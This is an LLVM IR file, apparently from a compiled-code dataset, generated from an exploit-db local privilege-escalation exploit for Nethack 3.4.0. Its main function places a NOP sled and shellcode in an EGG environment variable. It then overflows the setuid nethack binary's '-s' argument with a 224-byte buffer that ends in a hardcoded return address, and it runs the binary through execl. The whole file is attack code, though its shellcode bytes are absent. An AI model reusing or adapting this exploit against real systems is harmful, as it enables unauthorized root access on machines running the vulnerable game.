; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_22234.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_22234.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@stdout = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [25 x i8] c"\0A\09DSR-nethack.c By bob.\0A\00", align 1
@.str.1 = private unnamed_addr constant [33 x i8] c"Local Exploit for Nethack 3.4.0\0A\00", align 1
@.str.2 = private unnamed_addr constant [26 x i8] c"\09DSR-[www.dtors.net]-DSR\0A\00", align 1
@shellcode = common dso_local global i32* null, align 8
@.str.3 = private unnamed_addr constant [5 x i8] c"EGG=\00", align 1
@.str.4 = private unnamed_addr constant [13 x i8] c"ret: 0x%08x\0A\00", align 1
@.str.5 = private unnamed_addr constant [34 x i8] c"/usr/games/lib/nethackdir/nethack\00", align 1
@.str.6 = private unnamed_addr constant [8 x i8] c"nethack\00", align 1
@.str.7 = private unnamed_addr constant [3 x i8] c"-s\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i64, align 8
  %3 = alloca [224 x i8], align 16
  %4 = alloca [1024 x i8], align 16
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i64 3221224838, i64* %2, align 8
  store i32 0, i32* %6, align 4
  %7 = load i32, i32* @stdout, align 4
  %8 = call i32 (i32, i8*, ...) @fprintf(i32 %7, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str, i64 0, i64 0))
  %9 = load i32, i32* @stdout, align 4
  %10 = call i32 (i32, i8*, ...) @fprintf(i32 %9, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.1, i64 0, i64 0))
  %11 = load i32, i32* @stdout, align 4
  %12 = call i32 (i32, i8*, ...) @fprintf(i32 %11, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.2, i64 0, i64 0))
  %13 = getelementptr inbounds [224 x i8], [224 x i8]* %3, i64 0, i64 0
  %14 = call i32 @memset(i8* %13, i32 65, i32 224)
  %15 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4, i64 0, i64 0
  store i8* %15, i8** %5, align 8
  store i32 0, i32* %6, align 4
  br label %16

16:                                               ; preds = %26, %0
  %17 = load i32, i32* %6, align 4
  %18 = load i32*, i32** @shellcode, align 8
  %19 = call i32 @strlen(i32* %18)
  %20 = sub nsw i32 1024, %19
  %21 = sub nsw i32 %20, 1
  %22 = icmp slt i32 %17, %21
  br i1 %22, label %23, label %29

23:                                               ; preds = %16
  %24 = load i8*, i8** %5, align 8
  %25 = getelementptr inbounds i8, i8* %24, i32 1
  store i8* %25, i8** %5, align 8
  store i8 -112, i8* %24, align 1
  br label %26

26:                                               ; preds = %23
  %27 = load i32, i32* %6, align 4
  %28 = add nsw i32 %27, 1
  store i32 %28, i32* %6, align 4
  br label %16

29:                                               ; preds = %16
  store i32 0, i32* %6, align 4
  br label %30

30:                                               ; preds = %44, %29
  %31 = load i32, i32* %6, align 4
  %32 = load i32*, i32** @shellcode, align 8
  %33 = call i32 @strlen(i32* %32)
  %34 = icmp slt i32 %31, %33
  br i1 %34, label %35, label %47

35:                                               ; preds = %30
  %36 = load i32*, i32** @shellcode, align 8
  %37 = load i32, i32* %6, align 4
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds i32, i32* %36, i64 %38
  %40 = load i32, i32* %39, align 4
  %41 = trunc i32 %40 to i8
  %42 = load i8*, i8** %5, align 8
  %43 = getelementptr inbounds i8, i8* %42, i32 1
  store i8* %43, i8** %5, align 8
  store i8 %41, i8* %42, align 1
  br label %44

44:                                               ; preds = %35
  %45 = load i32, i32* %6, align 4
  %46 = add nsw i32 %45, 1
  store i32 %46, i32* %6, align 4
  br label %30

47:                                               ; preds = %30
  %48 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4, i64 0, i64 1023
  store i8 0, i8* %48, align 1
  %49 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4, i64 0, i64 0
  %50 = call i32 @memcpy(i8* %49, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.3, i64 0, i64 0), i32 4)
  %51 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4, i64 0, i64 0
  %52 = call i32 @putenv(i8* %51)
  %53 = load i64, i64* %2, align 8
  %54 = and i64 %53, 255
  %55 = trunc i64 %54 to i8
  %56 = getelementptr inbounds [224 x i8], [224 x i8]* %3, i64 0, i64 220
  store i8 %55, i8* %56, align 4
  %57 = load i64, i64* %2, align 8
  %58 = and i64 %57, 65280
  %59 = lshr i64 %58, 8
  %60 = trunc i64 %59 to i8
  %61 = getelementptr inbounds [224 x i8], [224 x i8]* %3, i64 0, i64 221
  store i8 %60, i8* %61, align 1
  %62 = load i64, i64* %2, align 8
  %63 = and i64 %62, 16711680
  %64 = lshr i64 %63, 16
  %65 = trunc i64 %64 to i8
  %66 = getelementptr inbounds [224 x i8], [224 x i8]* %3, i64 0, i64 222
  store i8 %65, i8* %66, align 2
  %67 = load i64, i64* %2, align 8
  %68 = and i64 %67, 4278190080
  %69 = lshr i64 %68, 24
  %70 = trunc i64 %69 to i8
  %71 = getelementptr inbounds [224 x i8], [224 x i8]* %3, i64 0, i64 223
  store i8 %70, i8* %71, align 1
  %72 = getelementptr inbounds [224 x i8], [224 x i8]* %3, i64 0, i64 224
  store i8 0, i8* %72, align 16
  %73 = load i32, i32* @stdout, align 4
  %74 = load i64, i64* %2, align 8
  %75 = call i32 (i32, i8*, ...) @fprintf(i32 %73, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.4, i64 0, i64 0), i64 %74)
  %76 = getelementptr inbounds [224 x i8], [224 x i8]* %3, i64 0, i64 0
  %77 = call i32 @execl(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.5, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.6, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i64 0, i64 0), i8* %76, i32* null)
  ret i32 0
}

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @strlen(i32*) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @putenv(i8*) #1

declare dso_local i32 @execl(i8*, i8*, i8*, i8*, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
